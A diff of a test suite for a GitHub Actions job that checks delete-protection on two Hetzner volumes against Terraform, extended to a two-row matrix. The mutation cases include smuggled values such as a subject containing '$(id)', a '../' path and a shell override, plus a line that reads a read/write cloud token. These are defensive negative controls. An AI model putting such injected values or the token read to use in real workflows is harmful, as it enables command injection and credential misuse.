@@ -2,11 +2,14 @@
 # Guard 1 (#9927 item 9 plan) -- the `sole-copy-protection-check` job of
 # `.github/workflows/scheduled-terraform-drift.yml`.
 #
-# PROPERTY. A live Hetzner object whose id is the pinned Inngest store volume and whose
-# `protection.delete` differs from the committed Terraform declaration (beyond the 90-minute apply
-# grace), or that is absent or ambiguous, always produces an issue of its own and a red run; a probe
-# that could not read Hetzner (including one that produced no verdict at all) never reports clean; the
-# job is read-only, prints no write recipe, and never holds the read/write Hetzner token.
+# PROPERTY. The job is a two-row matrix (#10432): `inngest` (the Inngest store volume) and `web1` (the web-1 workspaces
+# volume). For EACH row, a live Hetzner object carrying that row's name and pinned id whose `protection.delete` differs
+# from that row's own committed Terraform declaration (beyond 90 minutes of that file's last commit), or that is absent
+# or ambiguous, always produces that row's own issue and a red leg; a probe that could not read Hetzner (including one
+# that produced no verdict at all) never reports clean; no row's request, pin, expected flag, grace, titles, clear step or
+# email depends on the other row's data; the job is read-only, prints no write recipe, and never holds the read/write
+# Hetzner token. The full table runs on the `inngest` entry; the web-1 table (W rows) covers every arm where a row value
+# changes the outcome, the cross-entry rows (C) run both directions on one shared issue store, and use_entry is the oracle.
 #
 # HOW. Every step is EXTRACTED from the workflow by job id and step id (yaml.safe_load, never
 # re-implemented here) and EXECUTED under stubs: the real scripts/lib/bearer-curl.sh sits behind a stub
@@ -20,7 +23,11 @@
 # summary (conservation) and the FLOOR, so a helper that stops counting, or a deleted row, cannot turn
 # the run green. Rows that need a weaker stub, a weaker comparison or a neutered helper (H1-H7) prove the suite can see
 # them: end_row, invariants, want_steps, want_req and want_out each have a negative control. The invariants run for EVERY
-# case of a multi-case row (fold_inv folds the earlier cases in; H7), not only the last one.
+# case of a multi-case row (fold_inv folds the earlier cases in; H7), not only the last one, and under the entry of the
+# case they belong to (switch_entry folds before the constants move). H11-H17 are the negative controls of the matrix
+# context, the issue-store id ban, the N1c/N3 document bounds, the text helpers and N4. FLOOR and TABLE_ROWS are the realized
+# counts of the two-entry suite (284 assertions, 149 table rows). Edits to ADR-119, runbook 6604 and workspaces-luks.tf select
+# this suite too (scripts/lib/test-affected-paths.sh), because N1c, N3 and WR1 read them.
 #
 # EQUIVALENT MUTANTS and known limits (each proven in a sandbox, none a gap in a row):
 #   * exactly 90 minutes of age is deliberately unpinned (V3b brackets 89 and 91): the age is wall-clock.
@@ -32,6 +39,11 @@
 #   * a leak of a NON-prefix slice of a token (e.g. its last 8 characters) is a declared limit: the invariant scans the whole
 #     value and its first 6 characters only.
 #   * the Doppler tarball and `timeout` behaviour are exercised under stubs only (no network).
+#   * id_placement does not see a row value written with a YAML escape beside a comment naming the id (see id_placement).
+#   * the job-timeout clause `not jt > sum(bounds)` is EQUIVALENT (kept as defence in depth): every step bound is pinned to
+#     its exact value (the seven sum to 16 < 20), STEP_KEYSET forbids `timeout-minutes` on gate and notify, and step-sequence
+#     forbids a new step, so no edit reaches the sum without one of those firing first (S2 `r2 a timeout-minutes on the gate`
+#     names the label that does fire).
 #
 # Run: bash plugins/soleur/test/sole-copy-drift-check.test.sh
 # Override the workflow under test (mutation proofs on a COPY): SOLE_COPY_DRIFT_WF=/path/to/copy.yml
@@ -40,10 +52,10 @@ set -uo pipefail
 export TMPDIR="${TMPDIR:-/var/tmp}"
 
 # ANTI-VACUITY FLOOR at the REALIZED count (the number here and the number the run prints must agree).
-FLOOR=195
+FLOOR=284
 # Rows of the case table (every end_row call before the harness section), declared apart from the counters so
 # deleting one is a diff here (H3).
-TABLE_ROWS=126
+TABLE_ROWS=149
 
 if [[ -z "${_SC_DRIFT_INNER:-}" ]]; then
   _log=$(mktemp "$TMPDIR/sole-copy-drift.XXXXXX") || { printf 'FATAL: mktemp for the suite log\n' >&2; exit 2; }
@@ -82,6 +94,9 @@ TFREAL="$REPO_ROOT/apps/web-platform/infra/inngest-redis-luks.tf"
 RUNBOOK="$REPO_ROOT/knowledge-base/engineering/operations/runbooks/inngest-luks-cutover-6894.md"
 TIERS="$REPO_ROOT/knowledge-base/engineering/operations/runbooks/infra-credential-tiers-8209.md"
 SKILL="$REPO_ROOT/plugins/soleur/skills/postmerge/SKILL.md"
+ADR119="$REPO_ROOT/knowledge-base/engineering/architecture/decisions/ADR-119-luks-at-rest-for-the-live-workspaces-volume.md"
+RB6604="$REPO_ROOT/knowledge-base/engineering/operations/runbooks/workspaces-luks-cutover-6604.md"
+TFWEB1="$REPO_ROOT/apps/web-platform/infra/workspaces-luks.tf"
 JOB="sole-copy-protection-check"
 
 PASS=0
@@ -100,7 +115,7 @@ assert_fixture_dir() {
   esac
 }
 
-for f in "$WF" "$LOADER" "$LIBREAL" "$EXPRLIB" "$TFREAL" "$RUNBOOK" "$TIERS" "$SKILL"; do [[ -f "$f" ]] || fatal "missing $f"; done
+for f in "$WF" "$LOADER" "$LIBREAL" "$EXPRLIB" "$TFREAL" "$RUNBOOK" "$TIERS" "$SKILL" "$ADR119" "$RB6604" "$TFWEB1"; do [[ -f "$f" ]] || fatal "missing $f"; done
 command -v python3 >/dev/null || fatal "python3 not found"
 python3 -I -c 'import yaml' 2>/dev/null || fatal "python3 yaml module not importable"
 command -v jq >/dev/null || fatal "jq not found"
@@ -132,9 +147,109 @@ cat > "$TMP/h.py" <<'PYH' || fatal "write h.py"
 import copy, importlib.util, json, os, re, subprocess, sys
 import yaml
 
-WEB1 = "1064" + "43278"   # the OTHER sole-copy volume (web-1); asserted to appear nowhere
+# The two include rows' Hetzner ids, plain literals (the runbook pin-bump lists are regenerated with git grep). id-placement allows
+# each id exactly once in the job: as its own row's volume_id.
+INNGEST_ID = "106903269"
+WEB1 = "106443278"
+IDS = {"inngest": INNGEST_ID, "web1": WEB1}
+JOB_NAME = "sole-copy-protection-check (${{ matrix.entry }})"
+ROW_KEYS = ["adr", "entry", "subject", "tf_file", "tf_resource", "volume_id"]
+# The ONLY validation of row values (a pre-merge check over committed constants; the job has no runtime branch for them).
+ROW_PAT = {"entry": r"[a-z0-9]{1,16}", "subject": r"[A-Za-z0-9][A-Za-z0-9 -]{0,39}",
+           "tf_file": r"apps/web-platform/infra/[a-z0-9-]{1,64}\.tf", "tf_resource": r"[a-z0-9_]{1,64}",
+           "volume_id": r"[1-9][0-9]{0,11}", "adr": r"ADR-[0-9]{1,4}"}
 STEP_IDS = ["doppler_cli", "tf_commit", "probe", "file_finding", "file_unreadable", "clear", "notify", "gate"]
 GH_STEPS = {"tf_commit", "file_finding", "file_unreadable", "clear"}
+# EXACT SETS, taken from the job as it stands (review round 2). The harness runs each body as `bash --noprofile --norc -e`
+# under stubs, models every `uses:` step as a success it never runs, never applies the workflow `env:`, and evaluates only the
+# four expression contexts below. Whatever it does not model is pinned here to the one value the file has, so an edit to it
+# is a named S1 violation, never a run that diverges from the runner while every executed row stays green. What is pinned:
+# the workflow keys, concurrency, and env names AND values; the job keys and runs-on; the ordered step list (the checkout,
+# then the eight ids); each step's key set, env names AND each env value (the exact string), and `if:` (whitespace-collapsed);
+# the checkout's `uses` (the exact SHA) and `with`; the notify step's `uses` and `with` values; the expression context roots
+# every `if:`, `env:`, `with:` and `name:` may name. Env values are pinned because the harness renders them with a FIXTURE
+# `github` context (repository o/r, run_id 77) and with gha-expr.py's operator precedence (`!` binds looser than `==` there,
+# tighter on GitHub), so a value that branches on either renders one way here and another on the runner (review
+# verification pass, V1); the executed rows see only the harness's rendering.
+WF_KEYS = {"name", "on", "concurrency", "permissions", "env", "jobs"}
+WF_CONCURRENCY = {"group": "terraform-drift", "cancel-in-progress": False}
+WF_ENV = {"TERRAFORM_VERSION": "1.10.5", "TF_VAR_terraform_version": "1.10.5"}
+JOB_KEYS = {"name", "if", "runs-on", "timeout-minutes", "strategy", "steps"}
+RUNS_ON = "ubuntu-24.04"
+STEP_SEQ = [None] + STEP_IDS       # None is the checkout, the one step without an id
+STEP_KEYSET = {
+    None: ["timeout-minutes", "uses", "with"],
+    "doppler_cli": ["env", "id", "name", "run", "timeout-minutes"],
+    "tf_commit": ["env", "id", "name", "run", "timeout-minutes"],
+    "probe": ["env", "id", "if", "name", "run", "timeout-minutes"],
+    "file_finding": ["env", "id", "if", "name", "run", "timeout-minutes"],
+    "file_unreadable": ["env", "id", "if", "name", "run", "timeout-minutes"],
+    "clear": ["env", "id", "if", "name", "run", "timeout-minutes"],
+    "notify": ["continue-on-error", "id", "if", "name", "uses", "with"],
+    "gate": ["env", "id", "if", "name", "run"],
+}
+_GH = {"GH_TOKEN": "${{ github.token }}", "GH_REPO": "${{ github.repository }}"}
+_RUNLINK = {"SERVER_URL": "${{ github.server_url }}", "REPOSITORY": "${{ github.repository }}", "RUN_ID": "${{ github.run_id }}"}
+_PO = lambda k: "${{ steps.probe.outputs.%s }}" % k
+STEP_ENV = {   # step -> {env name: its exact value string}, taken from the job as it stands (review verification pass, V1)
+    "doppler_cli": {"DOPPLER_CLI_VERSION": "3.75.3", "DOPPLER_CLI_SHA256": "9c840cdd32cffff06d048329549ba2fa908146b385f21cd1d54bf34a0082d0db"},
+    "tf_commit": {"GH_TOKEN": "${{ github.token }}", "REPOSITORY": "${{ github.repository }}", "TF_PATH": "${{ matrix.tf_file }}"},
+    "probe": {"DOPPLER_TOKEN": "${{ secrets.DOPPLER_TOKEN }}", "DOPPLER_PROJECT": "soleur", "DOPPLER_CONFIG": "prd_terraform",
+              "TF_COMMIT_EPOCH": "${{ steps.tf_commit.outputs.epoch }}", "TF_PATH": "${{ matrix.tf_file }}",
+              "TF_RESOURCE": "${{ matrix.tf_resource }}", "PIN": "${{ matrix.volume_id }}", "SUBJECT": "${{ matrix.subject }}",
+              "ENTRY": "${{ matrix.entry }}"},
+    "file_finding": dict(_GH, ENTRY="${{ matrix.entry }}", SUBJECT="${{ matrix.subject }}", VERDICT=_PO("verdict"), NAME=_PO("name"),
+                         EXPECTED=_PO("expected"), LIVE=_PO("live"), HTTP=_PO("http"), TF_AGE_MIN=_PO("tf_age_min"), **_RUNLINK),
+    "file_unreadable": dict(_GH, SUBJECT="${{ matrix.subject }}", ADR="${{ matrix.adr }}", VERDICT=_PO("verdict"), NAME=_PO("name"),
+                            HTTP=_PO("http"), **_RUNLINK),
+    "clear": dict(_GH, SUBJECT="${{ matrix.subject }}", NAME=_PO("name"), **_RUNLINK),
+    "gate": {"VERDICT": _PO("verdict"), "HTTP": _PO("http"), "ENTRY": "${{ matrix.entry }}"},
+}
+_V = "steps.probe.outputs.verdict"
+STEP_IF = {
+    None: None, "doppler_cli": None, "tf_commit": None,
+    # The probe is not on the implicit success(): a failed fail-open input (the commit-time read) must not skip it.
+    "probe": "${{ !cancelled() && steps.doppler_cli.outcome == 'success' }}",
+    "file_finding": "always() && (%s == 'lifted-outside-terraform' || %s == 'volume-not-found')" % (_V, _V),
+    "file_unreadable": "always() && " + " && ".join("%s != '%s'" % (_V, w) for w in ("matches-declared", "unprotected-as-declared", "lift-pending-apply", "lift-not-applied", "lifted-outside-terraform", "volume-not-found")),
+    "clear": "always() && %s == 'matches-declared'" % _V,
+    "notify": "always() && (%s == 'lifted-outside-terraform' || %s == 'volume-not-found' || %s)" % (_V, _V, " || ".join("steps.%s.outcome == '%s'" % (s, o) for s in ("file_finding", "file_unreadable", "clear") for o in ("failure", "cancelled"))),
+    "gate": "always()",
+}
+CHECKOUT_USES = "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5"   # the exact SHA the job uses (V2), compared by equality
+NOTIFY_USES = "./.github/actions/notify-ops-email"
+NOTIFY_WITH = {
+    "subject": "[INFRA DRIFT] ${{ matrix.subject }} protection check needs attention",
+    "body": "<p><strong>The twice-daily ${{ matrix.subject }} protection check needs attention.</strong> Verdict: <code>${{ steps.probe.outputs.verdict }}</code>; declared <code>${{ steps.probe.outputs.expected }}</code>, live <code>${{ steps.probe.outputs.live }}</code>.</p><p><a href=\"${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\">Open the run</a>. The issue under the infra-drift label carries the facts and the pointers (${{ matrix.adr }}).</p><p>Issue filers: finding filer <code>${{ steps.file_finding.outcome }}</code>, could-not-perform filer <code>${{ steps.file_unreadable.outcome }}</code>, clear step <code>${{ steps.clear.outcome }}</code>. If any says failure, the issue channel itself did not accept or close an issue: read the named error in the run log.</p>",
+    "resend-api-key": "${{ secrets.RESEND_API_KEY }}",
+}
+CTX_ROOTS = {"secrets", "github", "steps", "matrix"}   # the contexts the harness models; gha-expr reads any other as null
+COE_STEPS = {"notify"}     # the only step origin/main gives continue-on-error
+
+def ws(s):
+    return " ".join(str(s).split()) if s is not None else None
+
+def expr_names(e):
+    # Every bare name an expression reads (string literals blanked; a name followed by `(` is a function), with the character
+    # after it: `runner.os` gives ("runner", "."), `toJSON(github)` gives ("github", ")").
+    s = re.sub(r"'(?:[^']|'')*'", "''", e)
+    out = []
+    for m in re.finditer(r"(?<![A-Za-z0-9_.\-])([A-Za-z_][A-Za-z0-9_\-]*)", s):
+        nxt = s[m.end():].lstrip()[:1]
+        if nxt == "(" or m.group(1) in ("true", "false", "null"):
+            continue
+        out.append((m.group(1), nxt))
+    return out
+
+def bad_names(e):
+    # The names outside the four modelled roots, and a modelled root not read with a dot (`github['x']`, a bare `steps`).
+    return sorted({n for n, nxt in expr_names(e) if n not in CTX_ROOTS or nxt != "."})
+
+def exprs(v, whole):
+    # The expressions inside one value: every ${{ }} segment, or (an `if:` without ${{ }}) the whole value.
+    v = str(v)
+    segs = re.findall(r"\$\{\{(.*?)\}\}", v, flags=re.S)
+    return segs if segs or not whole else [v]
 
 def region(lines, jobid):
     idx = [i for i, l in enumerate(lines) if re.match(r"^  %s:\s*$" % re.escape(jobid), l)]
@@ -159,6 +274,9 @@ def cmd_extract(wf, jobid, out):
     os.makedirs(out + "/steps", exist_ok=True)
     json.dump(job, open(out + "/job.json", "w"))
     json.dump(doc.get("permissions"), open(out + "/wfperm.json", "w"))
+    # Every workflow-level key but `jobs` (YAML 1.1 reads the bare key `on` as the boolean True).
+    json.dump({("on" if k is True else str(k)): v for k, v in doc.items() if k != "jobs"}, open(out + "/wftop.json", "w"))
+    json.dump(((job.get("strategy") or {}).get("matrix") or {}).get("include"), open(out + "/rows.json", "w"))
     open(out + "/jobtext.txt", "w").write(text)
     for s in job["steps"]:
         if s.get("id") and isinstance(s.get("run"), str):
@@ -179,7 +297,7 @@ def sites(job):
         if k != "steps":
             yield "job.%s" % k, v if isinstance(v, str) else json.dumps(v)
 
-def violations(job, text):
+def violations(job, text, top):
     v, steps = [], job.get("steps", [])
     st = {s.get("id"): s for s in steps if s.get("id")}
     ids = [s.get("id") for s in steps if s.get("id")]
@@ -190,9 +308,49 @@ def violations(job, text):
         v.append("duplicate-step-id")
     if job.get("if") != "github.ref == 'refs/heads/main'":
         v.append("job-if")
-    for k in ("environment", "env", "continue-on-error", "container", "services"):
-        if job.get(k):
-            v.append("job-" + k)
+    # The closed allow-lists (see WF_KEYS): workflow level, job level, every step, the checkout's `with:`.
+    for k in sorted(set(top) - WF_KEYS):
+        v.append("wf-key:" + k)
+    if top.get("concurrency") != WF_CONCURRENCY:
+        v.append("wf-concurrency")
+    wenv = top.get("env") if isinstance(top.get("env"), dict) else {}
+    if sorted(wenv) != sorted(WF_ENV) or any("${{" in str(val) for val in wenv.values()):
+        v.append("wf-env")
+    for k in sorted(set(wenv) & set(WF_ENV)):
+        if wenv[k] != WF_ENV[k]:
+            v.append("wf-env-value:" + k)
+    for k in sorted(set(job) - JOB_KEYS):
+        v.append("job-key:" + k)
+    if job.get("runs-on") != RUNS_ON:
+        v.append("job-runs-on")
+    # The ordered step list is exactly the checkout and the eight ids; each step's keys, env names and `if:` are exactly today's.
+    if [s.get("id") for s in steps] != STEP_SEQ:
+        v.append("step-sequence")
+    for s in steps:
+        key = s.get("id")
+        sid = key or "checkout"
+        if key not in STEP_KEYSET:
+            continue
+        for k in sorted(set(s) - set(STEP_KEYSET[key])):
+            v.append("step-key:%s:%s" % (sid, k))
+        for k in sorted(set(STEP_KEYSET[key]) - set(s)):
+            v.append("step-key-missing:%s:%s" % (sid, k))
+        senv = s.get("env") if isinstance(s.get("env"), dict) else {}
+        if key in STEP_ENV and sorted(senv) != sorted(STEP_ENV[key]):
+            v.append("step-env:" + sid)
+        for k in sorted(set(senv) & set(STEP_ENV.get(key, {}))):
+            if senv[k] != STEP_ENV[key][k]:
+                v.append("step-env-value:%s:%s" % (sid, k))
+        if ws(s.get("if")) != STEP_IF[key]:
+            v.append("step-if:" + sid)
+    # Every expression the harness evaluates reads only the four modelled contexts.
+    for loc, val, whole in [("job.if", job.get("if"), True), ("job.name", job.get("name"), False)] + \
+            [("%s.%s" % (s.get("id") or "checkout", k), x, k == "if") for s in steps
+             for k, x in [("if", s.get("if")), ("name", s.get("name"))] + [(k2, x2) for k2 in ("env", "with") for x2 in (s.get(k2) or {}).values()]
+             if x is not None]:
+        for e in exprs(val, whole):
+            for n in bad_names(e):
+                v.append("expr-context:%s:%s" % (loc, n))
     for s in steps:
         sid, uses = s.get("id") or "?", str(s.get("uses", ""))
         if "infra-credentials" in uses or "DopplerHQ/cli-action" in uses:
@@ -208,7 +366,7 @@ def violations(job, text):
         for k in env:
             if re.search(r"HCLOUD_TOKEN(?!_READONLY)", k):
                 v.append("rw-token-env")
-        if s.get("continue-on-error") and sid != "notify":
+        if "continue-on-error" in s and sid not in COE_STEPS:
             v.append("coe:" + sid)
         if isinstance(s.get("run"), str):
             if "${{" in s["run"]:
@@ -219,16 +377,12 @@ def violations(job, text):
         v.append("notify-not-coe")
     if re.search(r"HCLOUD_TOKEN(?!_READONLY)", text) or re.search(r"HCLOUD_TOKEN(?!_READONLY)", json.dumps(job)):
         v.append("rw-token-named")
-    if WEB1 in text or WEB1 in json.dumps(job):
-        v.append("web1-id")
+    v += matrix_shape(job) + id_placement(job, text)
     okloc = {("DOPPLER_TOKEN", "probe.env"), ("RESEND_API_KEY", "notify.with")}
     for loc, val in sites(job):
         for m in re.finditer(r"secrets\.([A-Za-z0-9_]+)", val):
             if (m.group(1), loc) not in okloc:
                 v.append("secret:%s@%s" % (m.group(1), loc))
-    for sid in ("file_finding", "file_unreadable", "clear", "notify", "gate"):
-        if sid in st and "always()" not in str(st[sid].get("if", "")):
-            v.append("no-always:" + sid)
     if "gate" in st and "exit 1" not in str(st["gate"].get("run", "")):
         v.append("gate-no-exit")
     runs = "\n".join(str(s.get("run", "")) for s in steps)
@@ -258,28 +412,34 @@ def violations(job, text):
     if len(re.findall(r"doppler secrets get", runs)) != 1:
         v.append("doppler-read-count")
     # Bounds, checkout hygiene, notify wiring and permissions (the wiring a green run never exercises).
-    if job.get("timeout-minutes") != 10:
-        v.append("job-timeout")
+    # The job cap sits ABOVE the sum of the step bounds (a step's own bound must fire first), and is pinned at 20.
     for sid, mins in {"doppler_cli": 3, "tf_commit": 2, "probe": 3, "file_finding": 2, "file_unreadable": 2, "clear": 2}.items():
         if sid in st and st[sid].get("timeout-minutes") != mins:
             v.append("step-timeout:" + sid)
-    if "permissions" in job:
-        v.append("job-permissions")
-    co = steps[0] if steps else {}
-    if not str(co.get("uses", "")).startswith("actions/checkout@") or (co.get("with") or {}).get("persist-credentials") is not False:
-        v.append("checkout-persist")
+    bounds = [s.get("timeout-minutes") for s in steps if "timeout-minutes" in s]
+    jt = job.get("timeout-minutes")
+    if jt != 20 or not all(isinstance(b, int) for b in bounds) or not jt > sum(bounds):
+        v.append("job-timeout")
+    # The checkout is found by what it is (the one step that uses a checkout action), not by its position.
+    cos = [s for s in steps if "checkout" in str(s.get("uses", ""))]
+    if len(cos) != 1:
+        v.append("checkout-count:%d" % len(cos))
+    co = cos[0] if cos else {}
+    if co.get("uses") != CHECKOUT_USES:
+        v.append("checkout-uses")
+    if co.get("with") != {"persist-credentials": False}:
+        v.append("checkout-with")
     if co.get("timeout-minutes") != 2:
         v.append("step-timeout:checkout")
-    # The probe must not be skipped by a failed fail-open input (the commit-time read): no implicit success().
-    if st.get("probe", {}).get("if") != "${{ !cancelled() && steps.doppler_cli.outcome == 'success' }}":
-        v.append("probe-if")
     nf = st.get("notify", {})
-    if nf.get("uses") != "./.github/actions/notify-ops-email":
+    if nf.get("uses") != NOTIFY_USES:
         v.append("notify-uses")
     if sorted((nf.get("with") or {}).keys()) != ["body", "resend-api-key", "subject"]:
         v.append("notify-with-keys")
     if (nf.get("with") or {}).get("resend-api-key") != "${{ secrets.RESEND_API_KEY }}":
         v.append("notify-resend-key")
+    if (nf.get("with") or {}) != NOTIFY_WITH:
+        v.append("notify-with")
     # The probe's single-writer / backstop structure: the closed set of finish arguments, exactly two writers of
     # `verdict=` (finish, and the EXIT trap, which can only say could-not-read), and the trap installed first.
     pl = [l.strip() for l in probe.splitlines() if l.strip() and not l.strip().startswith("#")]
@@ -328,6 +488,52 @@ def violations(job, text):
             v.append("probe-budget")
     return v
 
+def rows_of(job):
+    inc = ((job.get("strategy") or {}).get("matrix") or {}).get("include")
+    return [r for r in inc if isinstance(r, dict)] if isinstance(inc, list) else []
+
+def matrix_shape(job):
+    # strategy is exactly {fail-fast: false, matrix: {include: [two rows]}}; each row has exactly ROW_KEYS, each value a string
+    # matching its pattern; the entries are exactly inngest and web1; the job name carries the entry. See ADDING AN ENTRY in the
+    # job comment before changing any of this.
+    v = []
+    st = job.get("strategy") if isinstance(job.get("strategy"), dict) else {}
+    if sorted(st.keys()) != ["fail-fast", "matrix"]:
+        v.append("matrix-shape:strategy-keys")
+    if st.get("fail-fast", True) is not False:          # absent is the default, true
+        v.append("matrix-shape:fail-fast")
+    mx = st.get("matrix") if isinstance(st.get("matrix"), dict) else {}
+    if list(mx.keys()) != ["include"]:
+        v.append("matrix-shape:matrix-keys")
+    inc = mx.get("include")
+    if not isinstance(inc, list) or len(inc) != 2 or not all(isinstance(r, dict) for r in inc):
+        v.append("matrix-shape:row-count")
+    for r in rows_of(job):
+        if sorted(r.keys()) != ROW_KEYS:
+            v.append("matrix-shape:row-keys")
+        for k, pat in ROW_PAT.items():
+            if k in r and not (isinstance(r[k], str) and re.fullmatch(pat, r[k])):
+                v.append("matrix-shape:value:" + k)
+    if sorted(str(r.get("entry")) for r in rows_of(job)) != ["inngest", "web1"]:
+        v.append("matrix-shape:entries")
+    if job.get("name") != JOB_NAME:
+        v.append("matrix-shape:job-name")
+    return v
+
+def id_placement(job, text):
+    # Each id appears exactly once in the job's text and in its JSON, and its own row's volume_id equals it. That stops a step
+    # (run, env, with, if, name) or a comment naming either id in plain digits. It does NOT stop a row written with a YAML escape
+    # (`volume_id: "10\x36443278"` loads as the id, so the text count drops to 0) beside a comment naming the id (count 1 again):
+    # an accepted adversarial residual (CTO ruling 23 deleted the outside-row loop; review round 2 records the residual).
+    v, js = [], json.dumps(job)
+    for ent, vid in IDS.items():
+        if text.count(vid) != 1 or js.count(vid) != 1:
+            v.append("id-placement:count:" + ent)
+        own = [r for r in rows_of(job) if r.get("entry") == ent]
+        if len(own) != 1 or str(own[0].get("volume_id")) != vid:
+            v.append("id-placement:row:" + ent)
+    return v
+
 def setk(d, k, val):
     d[k] = val
     return d
@@ -356,8 +562,47 @@ def mutants():
     def m_secret(j, t):
         step(j, "notify")["env"] = {"X": "${{ secrets.DOPPLER_TOKEN_WRITE }}"}
         return j, t
+    def row(j, ent):
+        return next(r for r in j["strategy"]["matrix"]["include"] if r.get("entry") == ent)
+    def m_row(ent, fn):
+        def f(j, t):
+            fn(row(j, ent))
+            return j, t
+        return f
+    def m_strategy(fn):
+        def f(j, t):
+            fn(j["strategy"])
+            return j, t
+        return f
+    def m_rename(r, a, b):
+        r[b] = r.pop(a)
+    def m_swap(j, t):
+        ids = [s.get("id") for s in j["steps"]]
+        a, b = ids.index("file_finding"), ids.index("file_unreadable")
+        j["steps"][a], j["steps"][b] = j["steps"][b], j["steps"][a]
+        return j, t
+    def m_if_and(sid, cond):
+        def f(j, t):
+            s = step(j, sid)
+            s["if"] = s["if"] + " && " + cond
+            return j, t
+        return f
+    def m_pin_literal(j, t):
+        p = step(j, "probe")
+        p["run"] = p["run"].replace('readonly VOLUME_ID_PIN="$PIN"', "readonly VOLUME_ID_PIN=" + INNGEST_ID)
+        return j, t
     return [
-        ("environment", "job-environment", lambda j, t: (setk(j, "environment", "infra-privileged"), t)),
+        ("environment", "job-key:environment", lambda j, t: (setk(j, "environment", "infra-privileged"), t)),
+        ("m1: the job needs another job (skipped whenever that job is red)", "job-key:needs", lambda j, t: (setk(j, "needs", "drift-check"), t)),
+        ("m2: a job defaults.run.shell (every body exits 0 doing nothing)", "job-key:defaults", lambda j, t: (setk(j, "defaults", {"run": {"shell": "true {0}"}}), t)),
+        ("m4: a job concurrency group that cancels the sibling leg", "job-key:concurrency", lambda j, t: (setk(j, "concurrency", {"group": "sole-copy", "cancel-in-progress": True}), t)),
+        ("m5: a shell key on the finding filer", "step-key:file_finding:shell", lambda j, t: (setk(step(j, "file_finding"), "shell", "true {0}") and j, t)),
+        ("m12: runs-on a self-hosted label", "job-runs-on", lambda j, t: (setk(j, "runs-on", ["self-hosted", "sole-copy"]), t)),
+        ("m13: the checkout reads another ref", "checkout-with", lambda j, t: (step_first(j)["with"].update({"ref": "lift-staging"}) or j, t)),
+        ("the checkout uses another action", "checkout-uses", lambda j, t: (setk(step_first(j), "uses", "actions/checkoutx@abc") and j, t)),
+        ("continue-on-error: false written on the probe", "coe:probe", lambda j, t: (setk(step(j, "probe"), "continue-on-error", False) and j, t)),
+        ("BASH_ENV in a step env", "step-env:probe", lambda j, t: (step(j, "probe")["env"].update({"BASH_ENV": "/tmp/x"}) or j, t)),
+        ("the job timeout equal to the sum of the step bounds", "job-timeout", lambda j, t: (setk(j, "timeout-minutes", 16), t)),
         ("loader step", "loader-or-mutable-installer", lambda j, t: (j["steps"].insert(1, {"id": "x", "uses": "./.github/actions/infra-credentials"}) or j, t)),
         ("cli-action", "loader-or-mutable-installer", lambda j, t: (j["steps"].insert(1, {"id": "y", "uses": "DopplerHQ/cli-action@abc"}) or j, t)),
         ("DOPPLER_TOKEN beyond the probe", "doppler-token-outside-probe", lambda j, t: (step(j, "tf_commit").setdefault("env", {}).update({"DOPPLER_TOKEN": "${{ secrets.DOPPLER_TOKEN }}"}) or j, t)),
@@ -373,10 +618,25 @@ def mutants():
         ("probe id renamed", "missing-step:probe", lambda j, t: (setk(step(j, "probe"), "id", "probe2") and j, t)),
         ("job if constant false", "job-if", lambda j, t: (setk(j, "if", "false"), t)),
         ("gate loses its exit", "gate-no-exit", lambda j, t: (setk(step(j, "gate"), "run", step(j, "gate")["run"].replace("exit 1", "exit 0")) and j, t)),
-        ("filer loses always()", "no-always:file_finding", lambda j, t: (setk(step(j, "file_finding"), "if", "steps.probe.outputs.verdict == 'x'") and j, t)),
+        ("filer loses always()", "step-if:file_finding", lambda j, t: (setk(step(j, "file_finding"), "if", "steps.probe.outputs.verdict == 'x'") and j, t)),
         ("token read after the request", "token-read-not-before-request", m_reorder),
         ("fallback read of the read/write name", "rw-token-named", lambda j, t: (setk(step(j, "probe"), "run", step(j, "probe")["run"] + '\nHCLOUD' + '_TOKEN="$(doppler secrets get HCLOUD' + '_TOKEN --plain)"\n') and j, t)),
-        ("the other volume id in a comment", "web1-id", lambda j, t: (j, t + "\n# " + WEB1 + "\n")),
+        ("fail-fast true", "matrix-shape:fail-fast", m_strategy(lambda st: st.update({"fail-fast": True}))),
+        ("fail-fast absent (the default is true)", "matrix-shape:fail-fast", m_strategy(lambda st: st.pop("fail-fast", None))),
+        ("a third row after the two compliant ones", "matrix-shape:row-count", m_strategy(lambda st: st["matrix"]["include"].append(dict(st["matrix"]["include"][-1], entry="web2")))),
+        ("a missing row key", "matrix-shape:row-keys", m_row("web1", lambda r: r.pop("adr"))),
+        ("a renamed row key", "matrix-shape:row-keys", m_row("web1", lambda r: m_rename(r, "tf_file", "tf_path"))),
+        ("a duplicate entry", "matrix-shape:entries", m_row("web1", lambda r: r.update({"entry": "inngest"}))),
+        ("an entry outside its pattern", "matrix-shape:value:entry", m_row("web1", lambda r: r.update({"entry": "web1;x"}))),
+        ("a subject outside its pattern", "matrix-shape:value:subject", m_row("web1", lambda r: r.update({"subject": "web-1 $(id)"}))),
+        ("a tf_file outside its pattern", "matrix-shape:value:tf_file", m_row("web1", lambda r: r.update({"tf_file": "apps/web-platform/infra/../x.tf"}))),
+        ("a tf_resource with a metacharacter", "matrix-shape:value:tf_resource", m_row("web1", lambda r: r.update({"tf_resource": 'workspaces_luks"'}))),
+        ("a volume_id with a leading zero", "matrix-shape:value:volume_id", m_row("web1", lambda r: r.update({"volume_id": "0" + WEB1}))),
+        ("an adr outside its pattern", "matrix-shape:value:adr", m_row("web1", lambda r: r.update({"adr": "ADR-119x"}))),
+        ("the job name without the entry", "matrix-shape:job-name", lambda j, t: (setk(j, "name", "sole-copy-protection-check"), t)),
+        ("a pin literal in the probe", "id-placement", m_pin_literal),
+        ("the web-1 id in a comment", "id-placement", lambda j, t: (j, t + "\n      # " + WEB1 + "\n")),
+        ("the Inngest id in a step", "id-placement", lambda j, t: (setk(step(j, "gate"), "name", "gate " + INNGEST_ID) and j, t)),
         ("name filter dropped from the URL", "request-shape", m_url),
         ("method flag on the request", "request-method-or-header-flag", lambda j, t: (setk(step(j, "probe"), "run", step(j, "probe")["run"].replace("-sS --max-time", "-X GET -sS --max-time")) and j, t)),
         ("a second request site", "bc_curl-count", m_two_requests),
@@ -387,8 +647,8 @@ def mutants():
         ("finding filer timeout removed", "step-timeout:file_finding", lambda j, t: (drop(step(j, "file_finding"), "timeout-minutes") and j, t)),
         ("could-not-perform filer timeout removed", "step-timeout:file_unreadable", lambda j, t: (drop(step(j, "file_unreadable"), "timeout-minutes") and j, t)),
